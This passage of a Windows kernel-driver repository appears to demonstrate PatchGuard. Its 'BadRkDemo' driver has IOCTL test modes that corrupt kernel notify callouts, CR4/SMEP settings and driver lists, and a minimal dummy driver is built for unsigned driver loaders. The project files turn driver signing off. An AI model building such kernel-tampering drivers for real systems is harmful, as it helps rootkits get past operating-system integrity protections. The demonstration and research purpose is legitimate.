                    DbgPrintEx(DPFLTR_DEFAULT_ID,
                        DPFLTR_INFO_LEVEL,
                        "[PGDemo] SMEP not supported\r\n");
                }
                break;

            case TT_NOTIFY_CALLOUT:

                DbgPrintEx(DPFLTR_DEFAULT_ID,
                    DPFLTR_INFO_LEVEL,
                    "[PGDemo] Corrupting notify callout\r\n");

                status = SetNotifyFromPool();
                break;

            default:

                DbgPrintEx(DPFLTR_DEFAULT_ID,
                    DPFLTR_INFO_LEVEL,
                    "[PGDemo] %lx is unknown test type\r\n", 
                    rp->TestType);
                
                break;
            }

            status = STATUS_SUCCESS;
            bytesIO = sizeof(INOUT_PARAM);

            break;

        default:

            DbgPrintEx(DPFLTR_DEFAULT_ID,
                DPFLTR_INFO_LEVEL,
                "[PGDemo] %s hit with invalid IoControlCode\r\n", 
                __FUNCTION__);
            
            status = STATUS_INVALID_PARAMETER;
        };

    } while (FALSE);

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytesIO;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

/*
* UnsupportedDispatch
*
* Purpose:
*
* Unused IRP_MJ_* dispatch.
*
*/
NTSTATUS UnsupportedDispatch(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_NOT_SUPPORTED;
}

/*
* CreateDispatch
*
* Purpose:
*
* IRP_MJ_CREATE dispatch.
*
*/
NTSTATUS CreateDispatch(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[PGDemo] %s Create\r\n", 
        __FUNCTION__);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*
* CloseDispatch
*
* Purpose:
*
* IRP_MJ_CLOSE dispatch.
*
*/
NTSTATUS CloseDispatch(
    _In_ struct _DEVICE_OBJECT *DeviceObject,
    _Inout_ struct _IRP *Irp
)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL,
        "[PGDemo] %s Close\r\n", 
        __FUNCTION__);

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

/*
* BeaconRoutine
*
* Purpose:
*
* Print alive message in infinite loop with a short delay.
*
*/
_IRQL_requires_same_
_Function_class_(KSTART_ROUTINE)
VOID BeaconRoutine(
    _In_ PVOID StartContext
)
{
    LARGE_INTEGER tm, time;
    TIME_FIELDS SystemTime;

    UNREFERENCED_PARAMETER(StartContext);

    tm.QuadPart = -10000000;

    do {
        KeDelayExecutionThread(KernelMode, FALSE, &tm);

        KeQuerySystemTime(&time);
        RtlTimeToTimeFields(&time, &SystemTime);


        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[PGDemo] Beacon %02hd:%02hd:%02hd:%03hd\r\n",
            SystemTime.Hour,
            SystemTime.Minute,
            SystemTime.Second,
            SystemTime.Milliseconds);

    } while (1);
}

/*
* DriverEntry
*
* Purpose:
*
* Driver base entry point.
*
*/
NTSTATUS DriverEntry(
    _In_  struct _DRIVER_OBJECT *DriverObject,
    _In_  PUNICODE_STRING RegistryPath
)
{
    NTSTATUS            status = STATUS_UNSUCCESSFUL;
    HANDLE              hThread;
    UNICODE_STRING      SymLink, DevName, SddlString;
    OBJECT_ATTRIBUTES   Obja;
    PDEVICE_OBJECT      devobj;
    ULONG               t;

    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL, 
        "[PGDemo] %s\r\n",
        __FUNCTION__);

    RtlSecureZeroMemory(&g_osver, sizeof(RTL_OSVERSIONINFOW));
    g_osver.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    if (NT_SUCCESS(RtlGetVersion(&g_osver))) {
        if (g_osver.dwBuildNumber <= 10240) {

            DbgPrintEx(DPFLTR_DEFAULT_ID,
                DPFLTR_INFO_LEVEL, 
                "[PGDemo] This version of Windows is out of interest\r\n");

            return STATUS_NOT_SUPPORTED;
        }
    }
    else {
        return STATUS_INTERNAL_ERROR;
    }

    RtlInitUnicodeString(&DevName, PGDEMO_DEVICE);
    RtlInitUnicodeString(&SddlString, PGDEMO_DEVICE_SDDL);
    
    status = IoCreateDeviceSecure(DriverObject,
        0,
        &DevName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &SddlString,
        (LPCGUID)&GUID_PGDEMO,
        &devobj);

    DbgPrintEx(DPFLTR_DEFAULT_ID,
        DPFLTR_INFO_LEVEL, 
        "[PGDemo] %s IoCreateDeviceSecure(%wZ) = %lx\r\n", 
        __FUNCTION__, 
        &DevName, 
        status);

    if (NT_SUCCESS(status)) {

        RtlInitUnicodeString(&SymLink, PGDEMO_SYMLINK);
        status = IoCreateSymbolicLink(&SymLink, &DevName);

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL, 
            "[PGDemo] %s IoCreateSymbolicLink(%wZ) = %lx\r\n", 
            __FUNCTION__, 
            &SymLink, 
            status);

        devobj->Flags |= DO_BUFFERED_IO;

        for (t = 0; t <= IRP_MJ_MAXIMUM_FUNCTION; t++)
            DriverObject->MajorFunction[t] = &UnsupportedDispatch;

        DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = &DevioctlDispatch;
        DriverObject->MajorFunction[IRP_MJ_CREATE] = &CreateDispatch;
        DriverObject->MajorFunction[IRP_MJ_CLOSE] = &CloseDispatch;
        DriverObject->DriverUnload = NULL;

        devobj->Flags &= ~DO_DEVICE_INITIALIZING;

        hThread = NULL;
        InitializeObjectAttributes(&Obja, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
        if (NT_SUCCESS(PsCreateSystemThread(&hThread, THREAD_ALL_ACCESS, &Obja, NULL, NULL,
            (PKSTART_ROUTINE)BeaconRoutine, NULL)))
        {
            ZwClose(hThread);
        }
    }

    return status;
}

```

`Source/Examples/BadRkDemo/main.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2017 - 2020
*
*  TITLE:       MAIN.H
*
*  VERSION:     1.01
*
*  DATE:        02 Feb 2020
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#include <ntddk.h>
#include <intrin.h>
#include <wdmsec.h>

#include <initguid.h>

// {97F057F3-2296-4260-8259-DAB47EBF3CEE}
DEFINE_GUID(GUID_PGDEMO,
    0x97f057f3, 0x2296, 0x4260, 0x82, 0x59, 0xda, 0xb4, 0x7e, 0xbf, 0x3c, 0xee);

#define PGDEMO_DEVICE           L"\\Device\\PGDemo"
#define PGDEMO_SYMLINK          L"\\DosDevices\\PGDemo"
#define PGDEMO_DEVICE_SDDL      L"D:P(A;;GA;;;SY)(A;;GA;;;BA)"


//Disable nonmeaningful warnings.
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4054) // 'type cast' : from function pointer %s to data pointer %s
#pragma warning(disable: 4152) // nonstandard extension, function/data pointer conversion in expression
#pragma warning(disable: 4201) // nonstandard extension used : nameless struct/union


extern POBJECT_TYPE *IoDriverObjectType;

NTKERNELAPI
NTSTATUS
ObReferenceObjectByName(
    __in PUNICODE_STRING ObjectName,
    __in ULONG Attributes,
    __in_opt PACCESS_STATE AccessState,
    __in_opt ACCESS_MASK DesiredAccess,
    __in POBJECT_TYPE ObjectType,
    __in KPROCESSOR_MODE AccessMode,
    __inout_opt PVOID ParseContext,
    __out PVOID *Object);

_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
DRIVER_DISPATCH DevioctlDispatch;
_Dispatch_type_(IRP_MJ_CREATE)
DRIVER_DISPATCH CreateDispatch;
_Dispatch_type_(IRP_MJ_CLOSE)
DRIVER_DISPATCH CloseDispatch;

_Dispatch_type_(IRP_MJ_CREATE)
_Dispatch_type_(IRP_MJ_CREATE_NAMED_PIPE)
_Dispatch_type_(IRP_MJ_CLOSE)
_Dispatch_type_(IRP_MJ_READ)
_Dispatch_type_(IRP_MJ_WRITE)
_Dispatch_type_(IRP_MJ_QUERY_INFORMATION)
_Dispatch_type_(IRP_MJ_SET_INFORMATION)
_Dispatch_type_(IRP_MJ_QUERY_EA)
_Dispatch_type_(IRP_MJ_SET_EA)
_Dispatch_type_(IRP_MJ_FLUSH_BUFFERS)
_Dispatch_type_(IRP_MJ_QUERY_VOLUME_INFORMATION)
_Dispatch_type_(IRP_MJ_SET_VOLUME_INFORMATION)
_Dispatch_type_(IRP_MJ_DIRECTORY_CONTROL)
_Dispatch_type_(IRP_MJ_FILE_SYSTEM_CONTROL)
_Dispatch_type_(IRP_MJ_DEVICE_CONTROL)
_Dispatch_type_(IRP_MJ_INTERNAL_DEVICE_CONTROL)
_Dispatch_type_(IRP_MJ_SHUTDOWN)
_Dispatch_type_(IRP_MJ_LOCK_CONTROL)
_Dispatch_type_(IRP_MJ_CLEANUP)
_Dispatch_type_(IRP_MJ_CREATE_MAILSLOT)
_Dispatch_type_(IRP_MJ_QUERY_SECURITY)
_Dispatch_type_(IRP_MJ_SET_SECURITY)
_Dispatch_type_(IRP_MJ_POWER)
_Dispatch_type_(IRP_MJ_SYSTEM_CONTROL)
_Dispatch_type_(IRP_MJ_DEVICE_CHANGE)
_Dispatch_type_(IRP_MJ_QUERY_QUOTA)
_Dispatch_type_(IRP_MJ_SET_QUOTA)
_Dispatch_type_(IRP_MJ_PNP)
DRIVER_DISPATCH UnsupportedDispatch;

DRIVER_INITIALIZE DriverInitialize;
DRIVER_INITIALIZE DriverEntry;
#pragma alloc_text(INIT, DriverEntry)

typedef struct _KLDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    PVOID ExceptionTable;
    ULONG ExceptionTableSize;
    // ULONG padding on IA64
    PVOID GpValue;
    PVOID NonPagedDebugInfo;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT __Unused5;
    PVOID SectionPointer;
    ULONG CheckSum;
    // ULONG padding on IA64
    PVOID LoadedImports;
    PVOID PatchInformation;
} KLDR_DATA_TABLE_ENTRY, *PKLDR_DATA_TABLE_ENTRY;

#define PGDEMO_SET_TEST_TYPE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x0800, METHOD_BUFFERED, FILE_SPECIAL_ACCESS)

#define TT_DRIVER_LIST          0
#define TT_CR4                  1
#define TT_DRIVER_OBJECT        2
#define TT_NOTIFY_CALLOUT       3

typedef struct _INOUT_PARAM {
	ULONG TestType;
} INOUT_PARAM, *PINOUTPARAM;

```

`Source/Examples/BadRkDemo/pgdemo.inf`:

```inf
;
; pgdemo.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=System
ClassGuid={4d36e97d-e325-11ce-bfc1-08002be10318}
Provider=%ManufacturerName%
DriverVer=
CatalogFile=pgdemo.cat

[DestinationDirs]
DefaultDestDir = 12


[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]


[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]


[Strings]
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName=""
DiskName="pgdemo Source Disk"

```

`Source/Examples/BadRkDemo/pgdemo.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.29728.190
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "pgdemo", "pgdemo.vcxproj", "{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}.Debug|x64.ActiveCfg = Debug|x64
		{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}.Debug|x64.Build.0 = Debug|x64
		{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}.Debug|x64.Deploy.0 = Debug|x64
		{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}.Release|x64.ActiveCfg = Release|x64
		{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}.Release|x64.Build.0 = Release|x64
		{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}.Release|x64.Deploy.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {2ECF2917-8992-43CC-8950-A610775EAF84}
	EndGlobalSection
EndGlobal

```

`Source/Examples/BadRkDemo/pgdemo.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{1E5EBE96-FA8B-4EFF-B823-36D3772DBBF2}</ProjectGuid>
    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>pgdemo</RootNamespace>
    <WindowsTargetPlatformVersion>$(LatestTargetPlatformVersion)</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <EnableInf2cat>false</EnableInf2cat>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <EnableInf2cat>false</EnableInf2cat>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Link>
      <AdditionalDependencies>wdmsec.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Link>
      <AdditionalDependencies>wdmsec.lib;%(AdditionalDependencies)</AdditionalDependencies>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Inf Include="pgdemo.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="main.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Examples/BadRkDemo/pgdemo.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="pgdemo.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="main.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Source/Examples/BadRkDemo/pgdemo.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <SignMode>Off</SignMode>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <SignMode>Off</SignMode>
  </PropertyGroup>
</Project>
```

`Source/Examples/DummyDrv/dummy.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio 14
VisualStudioVersion = 14.0.25420.1
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "dummy", "dummy\dummy.vcxproj", "{3D8146DE-8064-46C0-9E70-CEEC357B2290}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{3D8146DE-8064-46C0-9E70-CEEC357B2290}.Release|x64.ActiveCfg = Release|x64
		{3D8146DE-8064-46C0-9E70-CEEC357B2290}.Release|x64.Build.0 = Release|x64
		{3D8146DE-8064-46C0-9E70-CEEC357B2290}.Release|x64.Deploy.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
EndGlobal

```

`Source/Examples/DummyDrv/dummy/dummy.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{3D8146DE-8064-46C0-9E70-CEEC357B2290}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>dummy</RootNamespace>
    <WindowsTargetPlatformVersion>$(LatestTargetPlatformVersion)</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
    <ALLOW_DATE_TIME>1</ALLOW_DATE_TIME>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <ALLOW_DATE_TIME>1</ALLOW_DATE_TIME>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <CodeAnalysisRuleSet>AllRules.ruleset</CodeAnalysisRuleSet>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <EnableInf2cat>false</EnableInf2cat>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
    <CodeAnalysisRuleSet>AllRules.ruleset</CodeAnalysisRuleSet>
    <RunCodeAnalysis>true</RunCodeAnalysis>
    <EnableInf2cat>false</EnableInf2cat>
    <TargetName>dummy</TargetName>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <SuppressStartupBanner>false</SuppressStartupBanner>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <FavorSizeOrSpeed>Speed</FavorSizeOrSpeed>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ExpandAttributedSource>true</ExpandAttributedSource>
      <AssemblerOutput>All</AssemblerOutput>
      <CompileAs>CompileAsC</CompileAs>
      <EnablePREfast>true</EnablePREfast>
      <TreatWarningAsError>false</TreatWarningAsError>
      <Optimization>MinSpace</Optimization>
    </ClCompile>
    <Link>
      <SuppressStartupBanner>false</SuppressStartupBanner>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <GenerateMapFile>true</GenerateMapFile>
      <MapExports>true</MapExports>
      <LargeAddressAware>true</LargeAddressAware>
      <EntryPointSymbol>DriverEntry</EntryPointSymbol>
      <RandomizedBaseAddress>true</RandomizedBaseAddress>
      <DataExecutionPrevention>true</DataExecutionPrevention>
      <Profile>false</Profile>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <TreatWarningAsError>false</TreatWarningAsError>
    </ClCompile>
    <Link>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Examples/DummyDrv/dummy/dummy.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Source/Examples/DummyDrv/dummy/dummy.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="14.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <SignMode>Off</SignMode>
  </PropertyGroup>
</Project>
```

`Source/Examples/DummyDrv/dummy/main.c`:

```c
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2016 - 2021
*
*  TITLE:       MAIN.C
*
*  VERSION:     1.03
*
*  DATE:        02 Apr 2021
*
*  Example driver for driver loaders usage (KDU/ALICE)
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <ntddk.h>

DRIVER_INITIALIZE DriverEntry;
#pragma alloc_text(INIT, DriverEntry)

/*
* DriverEntry
*
* Purpose:
*
* Driver base entry point.
*
*/
NTSTATUS DriverEntry(
    _In_  struct _DRIVER_OBJECT* DriverObject,
    _In_  PUNICODE_STRING RegistryPath
)
{
    PEPROCESS Process;
    PETHREAD Thread;
    KIRQL Irql;
    PSTR sIrql;

    /* This parameters are invalid due to nonstandard way of loading and should not be used. */
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    Irql = KeGetCurrentIrql();
    if (Irql <= DISPATCH_LEVEL) {

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[%s] Driver built at %s\r\n",
            __FUNCTION__, __TIMESTAMP__); // Set DriverModel to allow timestamps.

        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[%s] System range start is %p, code mapped at %p\r\n",
            __FUNCTION__,
            MmSystemRangeStart,
            DriverEntry);       

        Process = PsGetCurrentProcess();
        Thread = PsGetCurrentThread();
        DbgPrintEx(DPFLTR_DEFAULT_ID,
            DPFLTR_INFO_LEVEL,
            "[%s] Current Process : %lu (%p) Current Thread : %lu (%p)\r\n",
            __FUNCTION__,           
            HandleToULong(PsGetCurrentProcessId()),
